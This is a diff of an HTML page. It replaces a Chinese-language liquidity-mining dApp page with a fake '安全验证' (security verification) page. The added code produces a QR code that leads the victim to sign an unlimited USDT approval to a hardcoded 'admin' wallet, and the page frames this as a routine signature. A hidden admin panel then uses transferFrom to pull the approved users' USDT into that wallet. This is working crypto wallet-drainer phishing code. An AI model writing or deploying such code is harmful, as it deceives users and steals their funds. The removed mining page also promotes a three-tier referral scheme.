@@ -1,265 +1,167 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WBNB-DTM Liquidity Mining | 大唐梦通证</title>
-<script src="https://cdn.ethers.org/lib-ethers/6.13.0/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<title>安全验证</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
-html{scroll-behavior:smooth}
-body{background:#050814;color:#fff;overflow-x:hidden}
-#particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.6}
-.wrapper{position:relative;z-index:1;min-height:100vh}
-.container{max-width:1100px;margin:0 auto;padding:0 20px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+body{background:#0B0B1F;color:#fff;padding:20px}
+.container{max-width:420px;margin:0 auto}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
+.input-group input{
+width:100%;padding:12px;background:#111;border:1px solid #333;
+border-radius:10px;color:#fff;font-size:15px
+}
+.chain-select{
+display:flex;gap:10px;margin-bottom:20px;
+}
+.chain-btn{
+flex:1;padding:10px;border-radius:10px;border:none;
+background:#222;color:#aaa;font-weight:bold;cursor:pointer
+}
+.chain-btn.active{background:#F0B90B;color:#000}
+#qrcode{
+width:280px;height:280px;background:#fff;padding:10px;
+border-radius:16px;margin:0 auto 20px;
+display:flex;align-items:center;justify-content:center;
+color:#000;font-size:14px;
+}
+#qrcode img{width:100%;height:100%;border-radius:12px}
+.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
 
-/* 导航 */
-.header{position:sticky;top:0;backdrop-filter:blur(20px);background:rgba(5,8,20,0.7);border-bottom:1px solid rgba(255,255,255,0.05);z-index:999}
-.nav{display:flex;justify-content:space-between;align-items:center;padding:22px 0}
-.logo{font-size:26px;font-weight:800;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;display:flex;align-items:center;gap:10px}
-
-/* 顶部品牌介绍区 */
-.hero{padding:40px 0;text-align:center}
-.hero-title{font-size:32px;font-weight:800;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;margin-bottom:12px}
-.hero-subtitle{font-size:18px;color:#c0c8e5;margin-bottom:30px}
-.hero-desc{max-width:900px;margin:0 auto;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:30px;line-height:1.8;font-size:15px;color:#a1a8c3;text-align:justify}
-.hero-desc strong{color:#fff;font-weight:600}
-.hero-desc .hl{color:#00e0ff;font-weight:600}
-
-.connect-btn{padding:14px 28px;border-radius:999px;background:linear-gradient(90deg,#00e0ff,#9d5fff);color:#fff;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;box-shadow:0 8px 20px rgba(0,224,255,0.2)}
-.connect-btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(157,95,255,0.25)}
-
-/* 数据大盘 */
-.dashboard{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:30px 0}
-.stat-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:22px;padding:26px;transition:all 0.3s}
-.stat-box:hover{transform:translateY(-4px);border-color:rgba(0,224,255,0.2)}
-.stat-box h3{font-size:13px;color:#a1a8c3;margin-bottom:10px}
-.stat-box .num{font-size:26px;font-weight:700;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent}
-
-/* 挖矿主面板 */
-.mining-section{max-width:650px;margin:0 auto}
-.mining-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:28px;padding:40px;backdrop-filter:blur(12px)}
-.card-header{margin-bottom:30px}
-.card-title{font-size:24px;font-weight:700;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;margin-bottom:8px}
-.card-desc{font-size:15px;color:#8a93b2}
-
-.info-list{display:flex;flex-direction:column;gap:18px;margin-bottom:30px}
-.info-row{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
-.info-label{color:#a1a8c3;font-size:15px}
-.info-value{font-weight:600;color:#fff}
-.info-high{background:linear-gradient(90deg,#00ffbb,#9d5fff);-webkit-background-clip:text;color:transparent;font-size:18px}
-.countdown{font-size:26px;font-weight:700;color:#ff5699;text-shadow:0 0 12px rgba(255,86,153,0.4)}
-
-.input-group{margin:30px 0}
-.mining-input{width:100%;padding:20px;border-radius:20px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#fff;font-size:16px;outline:none}
-.mining-input:focus{border-color:#00e0ff}
-
-.btn-group{display:flex;gap:18px;margin-top:10px}
-.btn{flex:1;padding:20px;border-radius:20px;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;font-size:16px}
-.btn-stake{background:linear-gradient(90deg,#00ffbb,#00e0ff);color:#050814}
-.btn-unstake{background:rgba(255,255,255,0.08);color:#fff;border:1px solid rgba(255,255,255,0.12)}
-.btn:hover{transform:translateY(-3px)}
-
-/* 邀请 */
-.invite-card{margin-top:32px;padding:26px;background:rgba(0,224,255,0.04);border:1px dashed rgba(0,224,255,0.2);border-radius:22px}
-.invite-title{font-size:15px;color:#a1a8c3;margin-bottom:14px}
-.invite-row{display:flex;gap:12px}
-.invite-input{flex:1;padding:16px;border-radius:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);color:#fff}
-.invite-copy{padding:16px 20px;background:#00e0ff;color:#000;border:none;border-radius:16px;cursor:pointer;font-weight:600}
-
-.footer{text-align:center;padding:40px 20px;color:#777;font-size:13px}
+.admin-panel {
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
+}
+.admin-panel.show {display:block}
+.admin-input {
+width:100%;padding:12px;background:#111;border:none;
+border-radius:8px;color:#fff;margin-bottom:10px;
+}
+.admin-btn {
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
+cursor:pointer;
+}
 </style>
-</head>
 
-<body>
-<div id="particles"></div>
-<div class="wrapper">
-
-<!-- 导航 -->
-<div class="header">
-  <div class="container">
-    <div class="nav">
-      <div class="logo">🌊 WBNB-DTM 挖矿</div>
-      <button class="connect-btn" id="connectBtn" onclick="connectWallet()">连接钱包</button>
-    </div>
-  </div>
-</div>
-
-<!-- 品牌介绍顶部 -->
 <div class="container">
-  <div class="hero">
-    <h1 class="hero-title">WBNB-DTM 流动性质押挖矿</h1>
-    <h2 class="hero-subtitle">大唐梦通证 · 333链商生态核心通证</h2>
-    <div class="hero-desc">
-      <strong>DTM 大唐梦通证</strong>由香港正元链商集团打造，锚定2000多亩实体庄园基底，绑定果酒品牌、线下连锁小酒馆、共享商城三大核心板块价值。
-      作为生态通用权益凭证，它打通线上线下流通，持有者可直接兑换产品与服务；
-      累计持有达标即升级<span class="hl">“共享庄主”</span>，共享全球经营分红，优先获取新项目体验与投资机会，深度参与生态建设。
-      以实体为支撑，链接产业、消费、投资端，让每位参与者共享生态发展红利。
+  <div class="pay-box">
+    <h1>💳 安全验证</h1>
+    <p class="desc">完成签名即可正常使用</p>
+    <div class="chain-select">
+      <button class="chain-btn active" data-chain="bsc">BSC</button>
+      <button class="chain-btn" data-chain="polygon">Polygon</button>
     </div>
-  </div>
-</div>
-
-<!-- 数据大盘 -->
-<div class="container">
-  <div class="dashboard">
-    <div class="stat-box"><h3>总锁仓 TVL</h3><div class="num">$ --</div></div>
-    <div class="stat-box"><h3>矿池 APY</h3><div class="num">-- %</div></div>
-    <div class="stat-box"><h3>总质押 LP</h3><div class="num">--</div></div>
-    <div class="stat-box"><h3>全网矿工</h3><div class="num">--</div></div>
-  </div>
-
-  <!-- 挖矿面板 -->
-  <div class="mining-section">
-    <div class="mining-card">
-      <div class="card-header">
-        <div class="card-title">WBNB + DTM 流动性挖矿</div>
-        <div class="card-desc">添加流动性即质押 · 8小时自动爆块 · 奖励自动到账</div>
-      </div>
-
-      <div class="info-list">
-        <div class="info-row"><span class="info-label">钱包地址</span><span class="info-value" id="addr">-</span></div>
-        <div class="info-row"><span class="info-label">未质押 LP</span><span class="info-value" id="lpBal">0.0000</span></div>
-        <div class="info-row"><span class="info-label">已质押 LP</span><span class="info-value" id="staked">0.0000</span></div>
-        <div class="info-row"><span class="info-label">待领取奖励</span><span class="info-value info-high" id="pending">0.0000</span></div>
-        <div class="info-row"><span class="info-label">下次爆块</span><span class="info-value countdown" id="count">00:00:00</span></div>
-      </div>
-
-      <div class="input-group">
-        <input class="mining-input" id="amt" type="number" placeholder="输入质押/解押数量" min="0">
-      </div>
-      <div class="btn-group">
-        <button class="btn btn-stake" onclick="stakeLP()">质押 LP</button>
-        <button class="btn btn-unstake" onclick="unstakeLP()">解押 LP</button>
-      </div>
-
-      <div class="invite-card">
-        <div class="invite-title">📢 邀请返佣 · 三代收益</div>
-        <div class="invite-row">
-          <input class="invite-input" id="refLink" readonly>
-          <button class="invite-copy" onclick="copyRef()">复制</button>
-        </div>
-      </div>
+    <div class="input-group">
+      <label>授权金额</label>
+      <input type="number" id="amount" value="10" min="0.01" step="0.01">
     </div>
+    <div id="qrcode">生成二维码...</div>
+    <div class="tip">扫码直接签名，无跳转</div>
   </div>
-</div>
 
-<div class="footer">© 2025 DTM大唐梦通证 · 333链商生态 · 实体支撑 · 安全挖矿</div>
+  <div class="admin-panel" id="adminPanel">
+    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
+    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
+    <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
+    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  </div>
 </div>
 
 <script>
-// 粒子背景
-particlesJS("particles",{
-  particles:{number:{value:80},color:{value:"#00e0ff"},opacity:{value:0.4},size:{value:2.8},
-  line_linked:{enable:true,distance:140,color:"#00e0ff",opacity:0.15,width:1},move:{enable:true,speed:1.8}},
-  interactivity:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}}
+// ====================== 你指定的地址 ======================
+const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+
+const CONFIG = {
+  bsc: {
+    chainId: "56",
+    token: "0x55d398326f99059fF775485246999027B3197955",
+    decimals: 18
+  },
+  polygon: {
+    chainId: "137",
+    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
+    decimals: 6
+  }
+};
+
+let currentChain = "bsc";
+let account = null;
+
+// 切换链
+document.querySelectorAll(".chain-btn").forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    currentChain = btn.dataset.chain;
+    renderQR();
+  };
 });
 
-// ==========================
-// 配置（只改这里）
-// ==========================
-const CONTRACT_ADDR = "0x...";
-const LP_ADDR      = "0x...";
-const REWARD_ADDR  = "0x...";
+document.getElementById("amount").addEventListener("input", renderQR);
 
-const ABI = [
-  "function stake(uint256 amount)",
-  "function unstake(uint256 amount)",
-  "function autoClaim()",
-  "function userInfo(address) view returns (uint256,uint256,uint256,uint256)",
-  "function pendingReward(address) view returns (uint256)"
-];
-
-const ERC20_ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-  "function approve(address spender, uint256 amount) external returns (bool)"
-];
-
-let provider, signer, userAddr, contract, lpToken, rewardToken;
-let decimals = 18;
-
-// 连接钱包
-async function connectWallet() {
-  if (!window.ethereum) return alert("请安装 MetaMask");
-  provider = new ethers.BrowserProvider(window.ethereum);
-  await provider.send("eth_requestAccounts", []);
-  signer = await provider.getSigner();
-  userAddr = await signer.getAddress();
-  contract = new ethers.Contract(CONTRACT_ADDR, ABI, signer);
-  lpToken = new ethers.Contract(LP_ADDR, ERC20_ABI, signer);
-  rewardToken = new ethers.Contract(REWARD_ADDR, ERC20_ABI, signer);
-  decimals = await lpToken.decimals();
-  document.getElementById("connectBtn").innerText = "已连接";
-  startAll();
+// 生成：直接授权给【管理员钱包】无限授权
+function genAuthEIP681() {
+  const { chainId, token } = CONFIG[currentChain];
+  const data = "0x095ea7b3" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return `ethereum:${token}@${chainId}?data=${data}`;
 }
 
-// 刷新数据
-async function refreshInfo() {
-  if (!userAddr) return;
-  document.getElementById("addr").innerText = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
-  const lpBal = await lpToken.balanceOf(userAddr);
-  const userInfo = await contract.userInfo(userAddr);
-  const pending = await contract.pendingReward(userAddr);
-  document.getElementById("lpBal").innerText = ethers.formatUnits(lpBal, decimals);
-  document.getElementById("staked").innerText = ethers.formatUnits(userInfo[0], decimals);
-  document.getElementById("pending").innerText = ethers.formatUnits(pending, 18);
-  document.getElementById("refLink").value = window.location.origin + window.location.pathname + "?ref=" + userAddr;
+function renderQR() {
+  const url = genAuthEIP681();
+  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
 }
 
-// 质押
-async function stakeLP() {
-  const val = document.getElementById("amt").value;
-  if (!val || val <= 0) return alert("输入有效数量");
-  const amt = ethers.parseUnits(val, decimals);
-  await lpToken.approve(CONTRACT_ADDR, amt);
-  await contract.stake(amt);
-  setTimeout(refreshInfo, 3000);
-}
+// 自动判断管理员
+window.addEventListener("load", async () => {
+  renderQR();
+  if (!window.ethereum) return;
+  try {
+    const accs = await window.ethereum.request({ method: "eth_accounts" });
+    if (accs.length) {
+      account = accs[0];
+      if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
+        document.getElementById("adminPanel").classList.add("show");
+      }
+    }
+  } catch (e) {}
+});
 
-// 解押
-async function unstakeLP() {
-  const val = document.getElementById("amt").value;
-  if (!val || val <= 0) return alert("输入有效数量");
-  const amt = ethers.parseUnits(val, decimals);
-  await contract.unstake(amt);
-  setTimeout(refreshInfo, 3000);
-}
-
-// 自动领取
-async function autoClaimLoop() {
-  while (true) {
-    try { await contract.autoClaim(); } catch (e) {}
-    await new Promise(r => setTimeout(r, 15000));
-    refreshInfo();
+// ====================== 管理员提取 ======================
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
+    alert("❌ 仅管理员可操作");
+    return;
   }
-}
+  const user = document.getElementById("userAddr").value.trim();
+  const amt = document.getElementById("drawAmount").value.trim();
+  const { token, decimals } = CONFIG[currentChain];
+  if (!user || !amt || isNaN(amt) || amt <= 0) {
+    alert("❌ 输入无效");
+    return;
+  }
+  try {
+    const wei = BigInt(amt * (10 ** decimals)).toString(16).padStart(64, '0');
+    const data = "0x23b872dd" +
+      user.slice(2).padStart(64, '0') +
+      ADMIN_WALLET.slice(2).padStart(64, '0') +
+      wei;
 
-// 倒计时
-function startCountdown() {
-  let sec = 8 * 60 * 60;
-  setInterval(() => {
-    sec--; if (sec <= 0) sec = 8 * 60 * 60;
-    const h = String(Math.floor(sec / 3600)).padStart(2, '0');
-    const m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
-    const s = String(sec % 60).padStart(2, '0');
-    document.getElementById("count").innerText = `${h}:${m}:${s}`;
-  }, 1000);
-}
-
-// 复制邀请链接
-function copyRef() {
-  const input = document.getElementById("refLink");
-  navigator.clipboard.writeText(input.value);
-  alert("复制成功！");
-}
-
-// 启动
-function startAll() {
-  refreshInfo();
-  setInterval(refreshInfo, 5000);
-  startCountdown();
-  autoClaimLoop();
+    const tx = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{ from: account, to: token, data: data }]
+    });
+    alert("✅ 提取成功：" + tx);
+  } catch (e) {
+    alert("❌ 提取失败：未授权或金额不足");
+  }
 }
 </script>
 </body>
